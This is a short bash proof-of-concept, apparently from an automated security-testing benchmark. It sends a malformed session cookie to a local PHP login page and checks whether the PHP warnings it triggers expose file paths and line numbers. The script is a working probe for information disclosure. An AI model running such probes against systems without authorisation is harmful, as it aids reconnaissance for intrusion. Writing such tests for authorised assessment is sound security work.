#!/bin/bash
# POC: Demonstrates information disclosure through PHP error messages revealing file paths when invalid session IDs with illegal characters are sent to login.php endpoint
# Target: ./repo
# Created: 2025-11-07T18:41:44.095Z
# Session: benchmark-XBEN-095-24-mhp70jbg

# Information Disclosure - PHP Error Messages POC
# This script triggers PHP warnings that reveal sensitive file paths and implementation details
# by sending a session ID with illegal characters to the login.php endpoint

TARGET_URL="http://localhost:8080/login.php"
INVALID_SESSION_ID="invalid_session_id_with_underscores_and_bad_chars"

echo "[*] Testing PHP Error Information Disclosure Vulnerability"
echo "[*] Target: $TARGET_URL"
echo "[*] Method: Sending invalid session ID with illegal characters (underscores)"
echo ""

# Send POST request with invalid session ID containing underscores
echo "[*] Sending POST request with invalid session ID..."
echo ""

RESPONSE=$(curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Cookie: PHPSESSID=$INVALID_SESSION_ID" \
  -d "username=test&password=test" 2>&1)

echo "[*] Response received:"
echo "================================"
echo "$RESPONSE"
echo "================================"
echo ""

# Check for information disclosure indicators
if echo "$RESPONSE" | grep -q "/var/www/html/"; then
  echo "[!] VULNERABILITY CONFIRMED: File path disclosure detected!"
  echo "[!] Application revealed: /var/www/html/"
fi

if echo "$RESPONSE" | grep -q "session_start()"; then
  echo "[!] VULNERABILITY CONFIRMED: Function name and location disclosed!"
fi

if echo "$RESPONSE" | grep -q "login.php on line"; then
  echo "[!] VULNERABILITY CONFIRMED: Exact file and line number revealed!"
fi

if echo "$RESPONSE" | grep -q "Warning:"; then
  echo "[!] VULNERABILITY CONFIRMED: PHP warnings exposed to user!"
fi

echo ""
echo "[*] Information Disclosure Assessment Complete"